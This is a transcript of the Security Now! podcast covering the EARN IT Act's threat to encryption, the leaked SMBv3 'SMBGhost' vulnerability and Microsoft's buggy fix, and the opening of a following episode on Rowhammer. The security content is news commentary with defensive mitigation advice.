Sadly, EARN IT is a bipartisan effort, having been introduced by, no surprise, anti-encryption crusader Lindsey Graham, and also Richard Blumenthal and other legislators who continually use the specter of online child exploitation to argue for the weakening of encryption.  Remember that we discussed this back in December, end of last year.



While grilling Facebook and Apple, Lindsey threatened to regulate encryption unless the companies gave law enforcement access to encrypted user data while pointing to child abuse.  He said:  "You're going to find a way to do this, or we're going to do it for you."



LEO:  [Crosstalk].



STEVE:  Yeah.  "We're not going to live in a world" - oh, and did you hear about how our illustrious DOJ is in the loop here?  Anyway:  "We're not going to live in a world where a bunch of child abusers have a safe haven to practice their craft.  Period," said Lindsey.  "End of discussion."



So the EFF notes that one of the problems with the EARN IT bill, among many, is that the proposed legislation "offers no meaningful solution" to the problem of child exploitation.  In other words, it's got nothing to do with it.  The EFF wrote:  "It doesn't help organizations that support victims.  It doesn't equip law enforcement agencies with resources to investigate claims of child exploitation or training in how to use online platforms to catch perpetrators.  Rather, the bill's authors have shrewdly used defending children as the pretense for an attack on our free speech and security online."



LEO:  It's a straw man.  



STEVE:  Uh-huh.  If passed, the legislation will create a "National Commission on Online Child Sexual Exploitation Prevention" - okay, is that an acronym?  Doesn't look like it -  tasked with developing - oh, here it is - "best practices" for owners of Internet platforms to "prevent, reduce, and respond" to child exploitation online.  But, as the EFF maintains, best practices would essentially translate into legal requirements.  They said:  "If a platform failed to adhere to them, it would lose essential legal protections for free speech."  Meaning Section 230.



It turns out that the best practices approach arose from a pushback over the bill's predicted effects on privacy and free speech - they had to get extra slimy - pushback that caused its authors to roll out the new structure.  The best practices would be subject to approval or veto by the Attorney General, currently William Barr, who has himself already issued a public call for backdoors; the Secretary of Homeland Security, who has made a similar call; the chair of the FTC, the Federal Trade Commission, ditto again.  Everybody wants encryption bypass.



CNET talked to Lindsey Barrett, who's a staff attorney at Georgetown Law's Institute for Public Representation Communications and Technology, who said that the way that the bill is structured is a clear indication that it's meant to target encryption.  He said:  "When you're talking about a bill that is structured for the attorney general to give his opinion and have decisive influence over what the best practices are, it does not take a rocket scientist to concur," he said, "that this is designed to target encryption."



If the bill passes, the choice for tech companies comes down to either weakening their own encryption and endangering the privacy and security of all their users, or foregoing Section 230 protections and potentially facing a liability wave of lawsuits.  A senior legal counsel for the ACLU said:  "The removal of Section 230 liability essentially makes the best practices a requirement.  The cost of doing business without those immunities is too high."  So bravo, you slimy snakes.



LEO:  The thing that makes it slimy is if they were to be forthright and propose a bill, look, we don't like the fact that bad guys, including predators, child predators, can hide behind encryption, let's make encryption illegal, if they were to propose that bill, which is really what they want, everybody, we'd all stand up and say no, no.  So they're sneaking it in.  They don't mention, as Blumenthal pointed out, it doesn't mention encryption.  It just has the impact.  It's actually clever.



STEVE:  Yeah.



LEO:  But it points out that there isn't, I don't think, and they've run up against this before, the will in this country, people understand why breaking encryption's a bad thing.  So they're not going to - they're going to sneak around us.  So we all have to sit up and take notice.  Section 230's been under assault for a long time.  And that's another big problem.



STEVE:  Yes, yes, yes.



LEO:  It gives these online companies the same kind of protection the phone company has.  You cannot prosecute AT&T if a bad guy calls you up and says let's plan an attack on the United States.  You can't say, oh, that's AT&T's fault.  It's not AT&T's job to listen to every phone call and make sure nobody's planning sedition.  And no one ever knows that.



STEVE:  And we don't want that.



LEO:  No.



STEVE:  Yes.  We don't want, yes, we don't want that in our society.



LEO:  It's make the phone company untenable.



STEVE:  We wouldn't use it.



LEO:  So, well, that's the other side of this is you can't stop encryption.  It's done.



STEVE:  Right, right.



LEO:  So this pushes it underground, eliminates protections for us, normal people, honest people, and makes it possible for bad guys to get into anything we do, as well.  Such a bad idea.  There is a petition you can sign.  I mean, I would go out and do that, let them know that they didn't fool us.  



STEVE:  Well, and the problem is by so cleverly cutting this pie the way they have, where they made the cut, one also wonders, I mean, clearly this will be challenged.  It'll go through the courts.  It may end up getting up to the Supreme Court.  And again, it's like, oh, you know, would it get overturned or not?  I mean [sighing].



LEO:  What are you going to do?



STEVE:  Yeah.  Okay.  I'm going to do one more, and then take a break for our last spot and give one final burst of energy.  I wanted to share with our listeners, and I created a grc.sc shortcut for it:  grc.sc/covid, C-O-V-I-D.  Ars Technica has assembled the best backgrounder that I've seen.  They have a writer for them.  Beth, I guess it's Mole, or maybe Mole, M-O-L-E.  She's their health reporter.



LEO:  This is great.  This is so good.



STEVE:  Yes.  "She's interested in everything from biomedical research" - this is from her bio - "biomedical research to infectious disease, health policy, and law.  And she loves all things microbial.  Beth has a bachelor's in Biology and World Music from the College of William and Mary, and a Ph.D. in Microbiology from the University of North Carolina at Chapel Hill."



I learned things there that I had seen nowhere else.  For example, COVID-19.  What happened to -16, -17, and -18?  Well, no.



LEO:  2019; right?



STEVE:  It's from the year, 2019, exactly.  So, and she talks about the related strings, the other things that the other two, you know, SARS, as we call it, and then there's the something that dealt with more the Middle East where dromedaries were the first intermediary animal?



LEO:  That's MERS, yeah, Middle East Respiratory Syndrome, yeah.



STEVE:  That's right, MERS.  So anyway, for anyone who wants just a no-BS, clear, clean, incredibly factual walkthrough, she's been maintaining it daily.  The last it was updated that I saw was March 15th.  I'm sure that they'll be refreshing it.  So again, grc.sc/covid will just easily bounce you to it.  And I can't recommend it highly enough.  It was definitely worth reading during our present crazy times.



Something that's an impact that all this has had for Lorrie and me, we were very much looking forward to attending a presentation by W which was going to be early in April.  We subscribe to...



LEO:  You mean George W. Bush "W"?



STEVE:  Yes, yes.



LEO:  Forty-five?  Forty-three?  What is he, 43?



STEVE:  Yeah, he was, yeah.  And I'd just like to hug him and apologize for all the horrible things I said about him at the time.



LEO:  He's looking mighty good now; isn't he.  How do you like me now, huh?  What did he say at the inauguration?  Do you remember that?  He had a...



STEVE:  No.



LEO:  I can't say it.  It's a little profane.  Look it up.  Just look up "what did W. say at the inauguration." 



STEVE:  Oh, I do know.  Now I know what you're talking about.  When you said "profane" it's like, okay, yeah, that went into a different - it was categorized differently.  This is some weird "s" word.



LEO:  Anyway, sorry.  Okay.  On we go.  That ought to get you through this long march, please.  So I'm sorry you're going to miss that.



STEVE:  Yes.  We are, too.  It's the Distinguished Speakers series, and it was, I don't know, maybe eight different highly known speakers who came like every month and gave a presentation to our big...



LEO:  I love that, yeah.



STEVE:  Yeah.  Neat.  And I would have...



LEO:  It also has impacted - we are going to do a LastPass event with you, I'm very excited about that, in May, I think May 14th.  But that's going to be virtual now.  You were going to come up, I was looking forward to seeing you.  But I think the wise thing to do would be to put that online.



STEVE:  Oh, well, you can't.  Can you?  I don't, I mean, it would be very lonely to be lonely.  Lorrie, before you guys switched it to virtual, she said, "Honey, I'll drive."



LEO:  Aww.



STEVE:  She said, "I'm not getting on a plane."



LEO:  No.



STEVE:  And I said, "Well, okay, thank you, honey."  But then [crosstalk].



LEO:  Well, you're always welcome to drive up here.  And I'll just stand six feet away and wave at you.  It'll be great.



STEVE:  Yeah, well, I'm not going anywhere until this is...



LEO:  No.



STEVE:  What I feel is just this profound fatigue.  And that's what's so unusual eight days in.  I just, I bounce back in three or four.  So to me this says this is something new that my body is busy dealing with.  And it's, you know, it's letting me be functional, largely.  But I don't have nearly the energy that I typically do.



LEO:  Well, please, we're going to be done in five minutes.  When we're done, go to bed.  And you don't have to do next week.  If you're not 100%, let's take next week off.  Honestly.



STEVE:  Well, Leo.  That's going to be two weeks.  I'll be with bells on.  Okay.  SMBGhost Fiasco.  Okay.  So this also happened last week.  And this is crazy.  And it had the whole industry, like, what the heck?  Although Microsoft has not commented.  What appears to have happened is that Microsoft had become aware of an extremely critical flaw residing in its implementation of the latest version, which is v3.1.1, of its SMB file and resource sharing protocol, you know, SMB v3.1.1.  And it had prepared a fix for this problem.  But for whatever reason, Microsoft apparently decided at the last minute to pull it, not to include it in this last Tuesday's March Madness patch fest.  Perhaps they wanted to wait until April.  Who knows?  They're not saying, but we'll see why that was likely the right call at the time.



What we do know is that news of the apparently planned, but canned, vulnerability update became public knowledge last Tuesday, on Patch Tuesday.  I have a screen capture snippet from MalwareHunterTeam that says "A wormable SMBv3 vulnerability.  Great..." and then the crying tears emoji.  And this reads, and then the screen capture from clearly one of the official reports:  "CVE-2020-0796 is a remote code execution vulnerability."  Okay.  So we know there were 25.  There were actually 26.  But this one got, as we'll see, the evidence is it got pulled.



So 0796 is a remote code execution vulnerability in Microsoft Server Message Block 3.0.  An attacker could exploit this bug by sending a specially crafted packet to the target SMBv3 server, which the victim needs to be connected to.  Users are encouraged to disable SMBv3 compression and block TCP port 445 on firewalls and client computers, which is tantamount to saying stop using SMB.  The exploitation of this vulnerability opens systems up to a wormable - and that's the thing that scares everybody - attack, which means it would be easy to move from victim to victim.  So that appeared on Tuesday, March 10th.



So shades of WannaCry and NotPetya.  Those were also SMB wormable flaws.  The flaw in SMBv3 could not be more critical.  Those two infamous SMB worms exploited the flaws in SMBv1.  But this was a flaw in Microsoft's most recent release of SMB.  In fact, so recent that it affected only 32- and 64-bit versions of Windows 10 and Server, with releases 1903 and 1909.  So what's that, the last year, right, because I have 1909 on my most recent things, and they last for six months.  So for the last year.  Because earlier versions don't support the SMBv3.1.1 protocol.



So for whatever reason, actually it's because Microsoft's added compression, the earlier versions of v3 didn't have this problem.  Microsoft made a mistake.  And of course any time you hear compression, you just - our audience just nods wisely and says, "Ah, interpreters, yes."  No technical details have been published, but short and official summaries describing the bug were posted on the websites of two cybersecurity firms.  This is what's weird is that it wasn't in the set.  But they posted them, Cisco Talos and Fortinet.  Cisco's entry for it was quickly taken down, once it became clear that this maximally critical vulnerability was absent from the Patch Tuesday rollout.  It was expected, but missing.



Fortinet's entry was definitive, and I have a link here in the show notes to their entry about this.  Fortinet wrote:  "The vulnerability is due to an error when the vulnerable software handles a maliciously crafted compressed data packet.  A remote, unauthenticated attacker can exploit this to execute arbitrary code within the context of the application."  They didn't add "within the context of the server" because both ends of an SMBv3.1.1 connection turn out to be vulnerable.  And anytime we hear "compression," we know that an interpreter is underlying the problem.



Okay.  Next, the guys over at the cybersecurity firm Kryptos Logic performed an Internet-wide scan for all public systems or networks exposing the default port 445 to the public Internet.  And rather than just scanning for 443 - and boy, stand back, unfortunately - they checked the version of SMB answering at each discovered port and determined that approximately 48,000 Windows 10 hosts, whether servers or clients, or actually servers because they were accepting connections, 48,000 Windows 10 servers are, or were, vulnerable to attacks targeting this SMBv3.1.1 vulnerability.



And anyone who's curious, it turns out, can do the same.  There are several vulnerability scanners designed to detect Windows devices exposed to attacks hosted over on GitHub, including one created by Danish security researcher Ollypwn, who we've spoken of many times in the past.  It's designed to determine whether SMBv3 is enabled on the device, and whether the compression capability that triggers the bug is enabled.  So yes, anybody who's interested can grab a copy of that and run it on I guess the public Internet and find out how bad the problem still is.



Okay.  So this leaves us with the question of how the information leaked, and there are two theories currently circulating.  The first one looks at the Common Vulnerability Reporting Framework, CVRF, and Microsoft's Active Protections Program, that's MAPP.  These systems provide Microsoft with a mechanism for sharing details about upcoming patches with trusted industry partners - certainly those two are.  I was going to say "or were," but I'm sure they still are - such as antivirus makers and hardware vendors.  The theory here is that Microsoft may have shared a list of upcoming vulnerabilities slated for March.  And after all, remember that they are staging the previous month's, I forget what they call it.  It's not something anyone ever wants...



LEO:  Hot fixes?



STEVE:  It's the cumulative updates, but it's in Optional because it's for the upcoming month.  So they sort of have them there.



LEO:  Oh, their, like, insiders preview.



STEVE:  Getting them ready, yeah.  So it's like a preview of coming disasters.  Anyway - I mean attractions.  Patches.  So the theory is they may have shared the list of upcoming vulnerabilities, but then removed the bug, that is, the patch, from the list with little time for some vendors, namely Cisco Talos and Fortinet, to update their own security advisory pages in time.  Someone with the handle @regnil tweeted:  "Microsoft releases early versions of their CVRF to MAPP, and then pulls CVEs at the last minute without telling anyone.  When they then fail to publish the public CVRF in a timely manner, it's understandable that mistakes like this will happen."  Which suggests that the CVE was where that description came from, and that they grabbed the CVE, registered it with that, but said keep it private and so forth.



So the second theory is that the info about CVE-2020-0796 was accidentally shared via the Microsoft API, which some AV vendors, sysadmins, and reporters scrape for information about Patch Tuesday patches, as soon as they come out.  So there's an API which essentially allows bots and other automated access in a uniform format, thus Application Program Interface, to this information.  So the working theory there is that the bug may have been initially scheduled to be patched last week, but was later pulled without being removed from the API's backend database, thus eventually making its way into the Talos and Fortinet advisories.



Microsoft, for their part, has been mum about all of this, reportedly not returning anyone's request for comment.  And at the time they would not even say when a patch for what we knew on Tuesday was a glaring disaster just waiting to happen, would be delivered.  Knowing enough about the nature of the problem, which was a convenient side benefit of the inadvertent disclosure, many sites quickly posted their recommendations for immediate remediation.  They all said users are encouraged to disable v3 compression, SMBv3 compression, and block TCP port 445 on firewalls and client computers.



Now, of course most individuals were never in any danger from this, just as they were not from WannaCry.  As we know, our NAT routers are all behind a stateful, essentially a stateful firewall that simply drops anything inbound, like scanner probes, TCP SYN probes, to any port where it's not expected.  So if it's not a reply returning from something we initially initiated outbound, it's got nowhere to go, and it's just ignored.



So what happened next?  Two days later, Thursday, March 12th, Microsoft released a security advisory just as though this had been its plan all along.  I have a link in the show notes to the advisory.  In their advisory they write, kind of happily, with a cheery attitude:  "A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests.  An attacker who successfully exploited the vulnerability could gain the ability to execute code on the target server or client.  To exploit the vulnerability against a server, an unauthenticated attacker could send a specially crafted packet to a targeted server.  To exploit the vulnerability against a client, an unauthenticated attacker would need to configure a malicious SMBv3 server and convince a user to connect to it."



Then they said:  "The security update addresses the vulnerability by correcting how SMBv3 protocol handles these specially crafted requests."  Then they said under mitigations, none.  Under workarounds they had one.  They said:  "The following workaround may be helpful in your situation.  In all cases, Microsoft strongly recommends that you install the updates for this vulnerability as soon as they become available, even if you plan to leave this workaround in place."



And then they have a means for issuing a PowerShell command, which you could also definitely do from just the regular command shell.  Basically it's setting a parameter under CurrentControlSet\Services\LanmanServer\Parameters.  They're setting DisableCompression to equal one, a DWORD value of one, and forcing the change.  No reboot is necessary.  The workaround they said does not prevent exploitation of SMB clients.  Please see item two in the FAQ to protect clients.  They said SMB compression, get this, is not yet used by Windows or Windows Server, and disabling SMB compression has no negative impact on performance.  Which kind of makes you wonder why it's enabled now, if they don't use it.  But that's Microsoft.  And then they give a means for turning it back on after the storm has passed.



LEO:  So the thing to do is turn it off; right?  I mean, there's no reason not to.



STEVE:  Exactly.  Exactly.  So an examination of all available evidence strongly suggests that this super-critical bug was at first going to be patched on Tuesday.  Then for some reason Microsoft pulled it at the last minute, but not before their original intentions had been broadcast to their security partners.  Reading the description of the problem makes clear that this would be really bad.  So some Curious George went looking for Tuesday's patch and found it missing.  That made news, you know, OMG.  And then Microsoft was pretty much forced to release the patch two days later.



But wait, there's more.  Then the other shoe dropped.  Can you guess what?  If you guessed "a multitude of botched installations and other problems," you get the brass ring.  Having attempted to put this out into the world after the news of the problem had been mistakenly published, it now appears that Microsoft's original decision to hold this one back until it was fully ready was correct because at the moment it appears to be anything but ready.



The fix to this vulnerability is KB4551762.  According to user reports, it's failing to install and worse.  It's throwing - all of them begin with hex 800.  So we have f081f, 04005, 73701, f0988, 71160, 240016 errors during the installation process.  And there's stuff posted all over Microsoft Forums and Reddit and everywhere.  One had the subject "Win 10 Updates Giving Me Grief."



He writes:  "So I've had this issue since 7165, but the latest 1762 is also giving me the same problem.  Basically, after it installs, it gets to 7% on the 'working on updates' part, then tells me that it failed, and it's undoing changes.  Since 7165 had people complaining about bugginess and the like, I figured maybe that specific update was the issue, and used the tool that lets you hide updates.  Sadly, the current update is giving me the same issue, and I've done all the things like DISM, deleting the software distribution folder, using the update troubleshooter, CHKDSK, et cetera.  Everything is supposedly fine, even though there's clearly something wrong."



He said:  "Kind of at my wits' end.  I know I can just hide/pause updates, but it's not exactly a good idea to do for extended periods.  What can I do?"  And of course we also know that Windows 10 has taken effective control away from its users, so we can temporarily defer updates, but in no instance for very long.



Someone else said:  "Stuck when update."  He said:  "My laptop current in version 1909, KB4532693," meaning the current rollup.  "But when I update to KB4551762 [the new one], my device show we couldn't complete the updates.  Undoing changes.  Don't turn off your computer, and stuck there.  Thank you."



So users are posting on Microsoft's official Feedback Hub.  By the way, I tried to go there, and I learned I had to install an application in order to look at the Feedback Hub.



LEO:  Oh, that's crazy.  Geez.



STEVE:  So it's like, oh, really?  No, thank you.  On the Microsoft Community website and on Reddit, they're all saying, these are people who hang out in these places, none of the usual workarounds for the many various errors helped.  We also had f0988 and f0900 installation errors spotted and reported by Gunter Born one day after the release.  So that would have been last Friday.



One user reported through Microsoft's Feedback Hub:  "Manual Windows Update on the local client works once.  It finds the patch, then does nothing.  One can attempt to download and install from that page, but it doesn't work.  Next, go to the catalog.  Select correct configuration.  Download the patch.  Attempt to install.  Doesn't."



Another user said:  "When downloading this update, my PC started becoming slow and sluggish.  The update got stuck at 100%.  I restarted the PC, then Windows Updates broke and started looping for a while when checking updates.  It's now back to normal, but now I have a failed cumulative update."  Someone on Reddit wrote:  "So I've had this issue since KB4497165."  And this is a repeat pretty much of what the earlier guy said.



So those were just the installation problems.  And they may have been a saving grace for those users since, once the update is installed, all manner of things start going sideways.  Although less numerous than the reports of installation failures, there are CPU usage spikes, high disk system usage spikes, system shutdowns, and freezes.



One user wrote:  "These issues began yesterday, 3/13/20.  The update 2020-03 Cumulative Update for Windows 10 Version 1909 for x64-based Systems (KB4551762) has failed every time I try to install it with the error code," and he's got a new one.  It's 71160.  I think that was new.  "When the issue began, my disk drive also went to 100% with no change.  I restarted my PC multiple times, but both issues persisted."



Or then we have:  "After installing KB4551762 and KB4540673, my system has gone to trash.  Extremely slow and takes ages...."  Okay.  I'm tired of reading these.  Anyway...



LEO:  I bet Microsoft is, too.



STEVE:  It's like, wow.



LEO:  But the fact that not everybody has this problem, frequently Microsoft's bugs end up in interaction between that and something that people have installed, but not everybody's installed.



STEVE:  Yes, yes, yes.



LEO:  This sounds like that.



STEVE:  Yes.  And so on one hand we can say, okay, Microsoft, we're sorry that this system has become so fragile, making it necessary for you to test widely anything you do for these corner cases.  But you've written a fragile system.



LEO:  Right.



STEVE:  Clearly.  I mean, we're talking about a patch to fix a problem in SMB compression, and that they're not using, and really for the last year.  But it's there.



LEO:  Is it possible something abused it or - I don't know.



STEVE:  I don't know.



LEO:  It's weird, yeah.



STEVE:  In case any of our listeners are in or know of someone  in this problem, there is a procedure which has worked.  There's a video, a YouTube video produced by Microsoft Support, which I've linked to at the end of the show notes here.  It's a final Hail Mary for when your system is seriously borked, and nothing else works.  Basically it's a means for - it's called a "Windows 10 in-place upgrade" which preserves all your stuff, but basically it does an amalgamation of the past, binds it into an installation image, and then puts that back on your system so you are able to, you know.  And so anyway, this video may be of  use to somebody.  Verify the criteria, and it may be the only solution for recovering from this in some cases.



LEO:  Wow.



STEVE:  So it appears that Microsoft must have had, I mean, you know, they don't want this bug out there.  They must have had some idea that this 4551762 might not be ready for primetime and therefore pulled it back at the last minute.  And in retrospect this was probably the right decision.  The problem is as critical as it gets.  But on the other hand, we've seen that the total public exposure is around 48,000 systems, not 48 million.  And it wasn't a zero-day.  At the time it was completely unknown and not known to be exploited in the wild.  So you could argue that someone probably did.  You know, this is causing problems.  Let's just wait until we see a zero-day report, and then we'll drop it instantly, and we'll be heroes.  And so in the meantime let's see if we can make it work better because we have reports that it's not.



And it could have withstood.  Had it remained a secret, it absolutely could have withstood, clearly, another month of development.  It would have rolled out in April.  Everyone would have said, oh, thank you for patching this problem that we didn't know we had that you created.  But at least nobody got hurt by it.  Now we've got this wacky patch that nobody is happy with.  So just an unbelievable, here we are, third Patch Tuesday of the year.



LEO:  Poor Microsoft.



STEVE:  Oh, yeah.



LEO:  The thing is, if it's a third party doing something wrong, that's part of the issue with Microsoft, of course, a billion and a half installs.



STEVE:  That's a good point, too.  You're right.  Something has got its hooks in - if something has got its hooks into the OS.



LEO:  Right.  And maybe, you know, it's developers do all sorts of bad things.  Maybe somebody found this compression routine and wrote a program and said, well, it's there, I could use it, and uses it.  Or, you know, there are all sorts of things that could be causing this.



STEVE:  Okay.  So there is a well-known term, "hooking the API."



LEO:  Yeah.



STEVE:  That's bad.



LEO:  Not okay.



STEVE:  Not okay.  That's like the fact that hooking...



LEO:  But it happens all the time on Windows.



STEVE:  Yes, yes, because Microsoft doesn't give people a non-hooked ability to do what they want to do.  And so Microsoft imagines that they can just, like, no, we're not going to tell you about this stuff.  And unfortunately, people who, I mean, Symantec and - I don't mean to pick on them.  They just came to mind quickly because they're big.  Avast and so forth.



LEO:  All of these antivirus companies do this.



STEVE:  Yes.  They're paying their engineers to solve the problem.  So the engineer, who's happy to stay at home, especially now, rolls up his or her sleeve and says, "I'm going to find a way to hook this sucker so that I can get a brownie point at work."  And so, yup.  If you're allowed to be in the kernel with the rest of the kernel, if you're allowed to be in Ring 0, then that involves mutual trust because there are no rules down there.



LEO:  Right.



STEVE:  And so all the AVs have to have a service component that runs in the kernel, and nothing prevents them from misbehaving.  So I'm glad you brought that up because that really is probably the case, that it isn't sloppy coding.  The fact that such a smattering of total users have the problem suggests that there's something those people have in common.



LEO:  It's also why Microsoft's doing Windows 10X, which is going to come out this fall, which is a containerized version of Windows.  And they want to do that, I suspect to isolate these issues into containers so, if it does cause a problem, it at least doesn't bork the whole thing.  It only borks the individual containers.  It'll protect the operating system against rogue programs, I think.  I bet that that's the intent.



Steve, feel better.  I am so glad that you have such a commitment to coming in.  But seriously, dude, you're on death's door.  Go to bed.  We need you here next week and every week after that.  If you don't feel better next week, call in.



STEVE:  I won't tell you.



LEO:  Yeah, I know you won't.  Here, just gargle some Purell and go to bed.  No, don't.  I shouldn't even say that in jest.  Do not.  That'll blind you.



STEVE:  And not bleach, either.  Don't do that.



LEO:  No, don't [crosstalk]. 



STEVE:  God, there is so much idiocy out there.  Again, grc.sc/covid, C-O-V-I-D.  Ars Technica's backgrounder is written by a Ph.D. microbiologist, is so compelling.  For our listeners...



LEO:  Ars knocks it out of the park with everything they do.  Security, reviews, they are just - they have a standard that is just, I think, above and beyond.  I'm always happy to consult them.  If they say it, I believe it.



Steve Gibson, same thing.  Man, that's why you've got to listen every Tuesday about 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  Steve's getting out of here.  Go.  Go, Steve.  Go, Steve.  You can catch him at his website.



STEVE:  Thank you, everybody.  I'll see you next week.



LEO:  Bye-bye.  You can catch him at his website, GRC.com.  That's where SpinRite lives, which is his bread and butter.  But all sorts of other free stuff, discussions about SQRL.  It's actually a really great resource.  Look at this.  Health resources for vitamin suggestions.  I could just go on and on.  And you will, too.  It's a rabbit hole you'll want to go down, GRC.com.



If you want to message him, there is a feedback form there, GRC.com/feedback.  But it might be better to do it on Twitter.  He's always on Twitter, @SGgrc, and he accepts direct messages so you can DM him, @SGgrc.



When you go to get Security Now! on the site, you'll see there's a 16Kb version.  There is a 64Kb version.  Those are both audio.  And there's a transcript.  He pays to get a very nice transcript written by Elaine Farris - thank you, Elaine - who does a really stunning job.  She's very good.  And a lot of people, I think, because this show can be challenging, like to read along while they're listening to it.  So get those all at GRC.com.



We have audio, but we also have video at our website, TWiT.tv/sn.  You can go there, get a little bit of show notes, if you want.  Most of the best show notes are at Steve's site.  You can watch us do it live, as I said, on Tuesdays.  That's TWiT.tv/live.  Best thing you could do, if you ask me, subscribe.  Then it's a no-brainer.  You'll just have it.  If you subscribe in your favorite podcast application, it'll download the minute it's available, and you have it.  You can go to YouTube, subscribe there, too.  It's on YouTube.



It's also, and I always forget to mention this, but I'm going to mention it now.  It's on Amazon Echo.  It's on Google Home Assistant.  Probably, for all I know, it's on Siri and Cortana, too.  Just ask for it by name.  Say "Voice Assistant, play Security Now! podcast."  Sometimes adding "podcast" makes that work a little bit better.  And it should play.  The most recent version should play.  The live stream is also available, if you say "Echo, play TWiT live."  Most of the time that works.  It doesn't always work.  Don't know why.  Most of the time that works, so you can listen to the live stream.



If you are listening live, go on into the chatroom, irc.twit.tv, a great place to get all of the background chatter.  And a lot of smart people in there, too.  It's a very good place to hang out.  And this week, if you are sheltering in place, if you're self-isolating or quarantining, the chatroom is a great resource for you.  They're there 24/7.  There's somebody to talk to, some really nice people.  Our mods are the best in the business.  There's always a moderator in there.  But there are also a lot of great people who are listening to the show:  irc.twit.tv.  If you need some friends in this tough time, we're here for you, and they're here for you.



I will be back tomorrow, Windows Weekly.  We're going to interrupt right in the middle because Microsoft has a stream about their new Xbox One Sexy.  And that'll be, I think, 11:40, right in the middle of Windows Weekly, so we'll stop.  We'll start Windows Weekly.  As part of it we'll show this Microsoft event.  And then of course This Week in Google.



Stay tuned.  In about an hour from now, All About Android.  We're trying to be here as much as possible for you.  Our hosts are working out of their houses in most cases.  Our staff is, as well.  There's only a skeleton crew here at the LastPass Studios because we want to all keep everybody healthy.  I'm isolated, too.  I'm in my own office.  No one can come in here.  So I feel like this is a safe place for me to do the show.



Thank you.  Stay healthy.  Take care of yourself.  Take care of each other.  And we'll see you next time on Security Now!.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#759

DATE:		March 24, 2020

TITLE:		TRRespass

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-759.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at a new unpatched zero-day attack affecting billions of Windows users, Mozilla's reversal on TLS 1.0 and 1.1 deprecation due to the coronavirus, a welcome micropatch for Win7 and Server 2008, Chrome's altered release schedule during the coronavirus, Avast's latest screw-up, a new threat affecting Android users, the results from last week's Pwn2Own competition, and a few observations about the coronavirus math and some worthwhile explainer videos.  Then we look at where we are with Rowhammer after six years.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson's feeling better.  We've got a great show for you.  He is going to talk a little bit about COVID-19, but then we're also going to talk about the zero-day exploit that affects all versions of Windows and how you can fix it, and why Rowhammer is not about to go away anytime soon.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 759, recorded March 24th, 2020:  TRRespass.



It's time for Security Now!, the show where we cover your security, your privacy, talk about computing.  It's really a great show for anybody who's interested in these matters.  And of course it's all because of this guy, Steve Gibson, the man about town.  He's in a top hat and tails today with a little - because he's feeling better; right?  You're feeling better.



STEVE GIBSON:  I'm a little less, well, yes.  The fact that I'm here.  I may, like that, cough a little bit. 



LEO:  Do it in your sleeve.  That's okay.



STEVE:  Yeah.  The thing that's enduring is a very, like the tail end of just a dry, non-productive cough.



LEO:  Right.



STEVE:  So there is a respiratory component which never got very bad for me, fortunately.  But that seems to be hanging on.  But I've got most of my energy back.



LEO:  Good.



STEVE:  Although I have to say, Leo, I got knocked on my butt after last week's podcast.



LEO:  Oh, really.  Sorry.



STEVE:  Oh.  Lorrie looked at me, and she said, "Okay, honey, now remember this when you're considering doing it again."  And I said no.



LEO:  That took it out of you.  That took it out of you.



STEVE:  It really did.



LEO:  Oh, I'm sorry.



STEVE:  But I'm glad I did it, and I'm feeling really back up to snuff.  Well, it was my decision.  I could have said I, you know, can't do it.  But I don't want to break my record, Leo.



LEO:  Well, it's unblemished, despite illness.



STEVE:  We have, for our 759th podcast, "TRRespass" is the title, with two R's, T-R-R-e-s-p-a-s-s.  We're going to essentially take a look at where we are six years downstream from the Rowhammer revelation.



LEO:  Wow.  It's that long?  It's been six years?



STEVE:  Half this podcast ago.



LEO:  Wow.



STEVE:  Yes.  So we're going to take a look at a new unpatched zero-day attack, found in the wild, being currently used in limited fashion against billions, well, there are billions of potential Windows users, but it's currently being selective.  Microsoft knows about it.  They have not patched it.  We have got to wait three weeks, which is when the April Patch Tuesday occurs.



LEO:  Are you talking about the type meta?  The type flaw?  The zero-day with type rendering?



STEVE:  Yes, yes, yes.  The Adobe font rendering attack.  There are some mitigations we'll talk about.  You know, and so, well, anyway, we'll get to that.  Also Mozilla reversed themselves on TLS 1.0 and 1.1 deprecation.



LEO:  Good, I think.



STEVE:  Yeah, we're going to take a welcome look at a micropatch for Win7 and Server 2008 for things that are maybe important, which Microsoft is never going to fix.  So we're beginning to walk down this road now of encountering important things which are continually being discovered in a version of Windows that still has not now half, but still close to half, of the user base.  We've also got Chrome's and Edge's altered release schedules.  Avast's latest screw-up.  We have a new threat affecting Android users.  The results of last week's virtual Pwn2Own competition.



LEO:  That was pretty funny, yeah.



STEVE:  Yeah.



LEO:  They mailed in the exploits.



STEVE:  We have a few observations about the coronavirus math that I wanted to point our listeners to, or just some things to think about.  And also I'm going to share two more of my shortcuts for two really amazing videos that I've discovered since last week.  You've seen them both.  I think I've sent them both to you, Leo.



LEO:  Yes, yes.



STEVE:  And then we're going to dig into Rowhammer, where we are after six years.



LEO:  Wow.



STEVE:  And of course we have an apropos, very nerdy Picture of the Week.



LEO:  We do indeed.



STEVE:  So a listener of ours by the name of Tony Davis emailed this Picture of the Week to me, saying he thought it would be perfect, given the current state of the world.  And I have to agree.  It is a sort of a sign that reads:  "Please stay @ 127.0.0.1.  Don't be 255.255.255.255."



LEO:  Now, I know 127.0.0.1 is home, local home.



STEVE:  Correct.  Please stay at home.



LEO:  What is 255, quad 255?



STEVE:  So all Ethernet controllers and Internet-connected devices will accept - they will listen to anything coming from there.  That's the broadcast IP.



LEO:  Oh, I get it.



STEVE:  So it's perfect.  It's like, don't be broadcasting whatever it is you might have.



LEO:  Please stay at home.  Don't be broadcasting.  I love it.



STEVE:  Exactly.  It's perfect.



LEO:  Very clever.



